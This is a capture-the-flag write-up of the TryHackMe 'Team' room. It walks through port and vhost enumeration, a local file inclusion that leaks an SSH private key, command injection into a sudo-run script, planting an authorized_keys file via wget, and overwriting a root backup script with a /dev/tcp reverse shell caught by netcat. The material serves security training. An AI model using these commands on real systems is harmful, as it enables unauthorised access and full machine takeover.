<p align="center">
  THM : Team<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/teamcw<br>
  <img src="https://i.imgur.com/jCwmLy2.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Exploiting LFI](#exploiting-lfi)
- [Privilege escalation (gyles)](#privilege-escalation-gyles)
- [Privilege escalation (root)](#privilege-escalation-root)
- [Conclusion](#conclusion)

## Nmap scan

Let's run an agressive [nmap](https://nmap.org/book/man.html) scan against the target to enumerate services and open ports :  
```
attacker@AttackBox:~/Team$ nmap 10.10.95.110 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-28 20:33 CET
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 62.52% done; ETC: 20:35 (0:00:44 remaining)
Nmap scan report for 10.10.95.110
Host is up (0.036s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.81 seconds
```

There is 3 open ports.
- port 21 -> FTP
- port 22 -> SSH
- port 80 -> HTTP

## Website enumeration

If you look at the nmap scan, there is a message in the title of the `index.html` page : `It works! If you see this add 'te...`. By using curl, we can get the full title :  
```
attacker@AttackBox:~/Team$ curl http://10.10.95.110 | grep title
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11366  100 11366    0     0   102k      0 --:--:-- --:--:-- --:--:--  102k
    <title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
```

Let's add this domain to our `/etc/hosts` file :  
```
attacker@AttackBox:~/Team$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	AttackBox
10.10.95.110	team.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, let's run a [gobuster](https://github.com/OJ/gobuster) scan against `http://team.thm/` :  
```
attacker@AttackBox:~/Team$ gobuster dir -u http://team.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/01/28 20:48:44 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/server-status        (Status: 403) [Size: 273]
Progress: 220532 / 220561 (99.99%)
===============================================================
2023/01/28 21:02:25 Finished
===============================================================
```

Nothing interesting using [gobuster](https://github.com/OJ/gobuster) in dir mode. Same when enumerating the website manually using a web browser. So let's try to 
use [gobuster](https://github.com/OJ/gobuster) in vhost mode :  
```
attacker@AttackBox:~/Team$ gobuster vhost -u http://team.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain team.thm --append-domain
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://team.thm
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.2.1
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/01/28 21:09:59 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.team.thm Status: 200 [Size: 187]
Found: www.dev.team.thm Status: 200 [Size: 187]
Found: gc._msdcs.team.thm Status: 400 [Size: 422]
Progress: 4976 / 4990 (99.72%)
===============================================================
2023/01/28 21:11:16 Finished
===============================================================
```

So we found 3 vhosts, but I think two of them are false positives. The only interesting one is `dev.team.thm`. Let's add this to our `/etc/hosts` file :  
```
attacker@AttackBox:~/Team$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	AttackBox
10.10.95.110	team.thm	dev.team.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, let's access this vhost using a web browser :  
![](https://i.imgur.com/CpFGBYy.jpg)  

If we click on `Place holder link to team share`, we are redirected to this page :  
![](https://i.imgur.com/TcUWMOs.jpg)  

## Exploiting LFI

Maybe we can exploit a LFI (Local File Inclusion). Let's try to read `/etc/passwd` :  
![](https://i.imgur.com/4OpYnFy.jpg)  

It works ! If we read `/etc/ssh/sshd_config`, we can find a username and a private key for the SSH service :  
![](https://i.imgur.com/6RZdAAf.jpg)  

We can save this private key in a file (make sure to remove the all the `#`), and try to login as `dale` on SSH with it :  
```
attacker@AttackBox:~/Team$ nano id_rsa 
attacker@AttackBox:~/Team$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
...
{HIDDEN}
...
-----END OPENSSH PRIVATE KEY-----
attacker@AttackBox:~/Team$ chmod 600 id_rsa 
attacker@AttackBox:~/Team$ ssh dale@team.thm -i id_rsa 
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$
```

And we are logged in as dale ! Let's get the user flag :  
```
dale@TEAM:~$ ls
user.txt
dale@TEAM:~$ cat user.txt 
THM{*********}
```

## Privilege escalation (gyles)

Let's try to escalate our privileges. We can use `id` to see what groups we are member of :  
```
dale@TEAM:~$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
```

We are part of `sudo` group. Let's use `sudo -l` to see our sudo rights :  
```
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

We can run `/home/gyles/admin_checks` as `gyles`. Let's see what permissions we have on this file :  
```
dale@TEAM:~$ ls -la /home/gyles/admin_checks
-rwxr--r-- 1 gyles editors 399 Jan 15  2021 /home/gyles/admin_checks
```

We have read permissions on this file so let's read it to see what it does :  
```
dale@TEAM:~$ cat /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

We can inject a command to get a shell as `gyles` when running this script :  
```
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: test
Enter 'date' to timestamp the file: /bin/bash
The Date is whoami
gyles
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```

Now we have a shell as `gyles`. We can get a better shell by logging in on SSH. We have to write our own SSH public key in `/home/gyles/.ssh/`. So first, let's generate a key pair :  
```
attacker@AttackBox:~/Team$ ssh-keygen -f gyles_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in gyles_rsa
Your public key has been saved in gyles_rsa.pub
The key fingerprint is:
SHA256:ZEm3NYDlrE5zUoxCJNOBrTWsLgcMrgrczmfB4DINK54 attacker@AttackBox
The key's randomart image is:
+---[RSA 3072]----+
|    o*+..o+.o    |
|.   .+*..B o .   |
|.o   +..= *      |
| oo.o  + o       |
|o *oo   S .      |
|+=.+oo o +       |
|= *o  . .        |
|.E o o           |
|    o            |
+----[SHA256]-----+
```

Then, we can start a web server using python :  
```
attacker@AttackBox:~/Team$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Now, let's download the public key we created to the target :  
```
cd /home/gyles/.ssh
pwd  
/home/gyles/.ssh
wget http://10.14.32.60:8080/gyles_rsa.pub
ls
gyles_rsa.pub  known_hosts
```

Don't forget to rename the file to `authorized_keys`
```
mv gyles_rsa.pub authorized_keys
ls
authorized_keys  known_hosts
```

Now we can use the private key we created to login as `gyles` on SSH :  
```
attacker@AttackBox:~/Team$ ssh gyles@team.thm -i gyles_rsa 
Last login: Sun Jan 17 15:35:55 2021
gyles@TEAM:~$
```

## Privilege escalation (root)

Now, it's time to get root. Let's see if we are part of other groups :  
```
gyles@TEAM:~$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```

We are part of the `admin` group. Let's try to find files that belong to this group :  
```
gyles@TEAM:~$ find / -type f -group admin 2>/dev/null
/usr/local/bin/main_backup.sh
```

This file seems to be an automated backup script. We have write permissions on it so we can write a reverse shell in it and get a reverse shell as root :  
```
gyles@TEAM:~$ echo '#/bin/bash' > /usr/local/bin/main_backup.sh
gyles@TEAM:~$ echo 'sh -i >& /dev/tcp/10.14.32.60/4545 0>&1' >> /usr/local/bin/main_backup.sh
gyles@TEAM:~$ cat /usr/local/bin/main_backup.sh
#/bin/bash
sh -i >& /dev/tcp/10.14.32.60/4545 0>&1
```

Now, let's start a netcat listener on our host on port 4545 :  
```
attacker@AttackBox:~/Team$ nc -lnvp 4545
listening on [any] 4545 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.80.243] 48648
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),1004(admin)
```

We are root ! Let's get the root flag :  
```
# cd /root
# ls
root.txt
# cat root.txt
THM{************}
```

## Conclusion

In this room, we practiced :  
- Services and ports enumeration using [nmap](https://nmap.org/book/man.html)
- Manual website enumeration
- Website enumeration using [gobuster](https://github.com/OJ/gobuster)
- LFI (Local File Inclusion) exploiting
- Linux privileges escalation

Thanks for this room and thanks for reading my write ups !
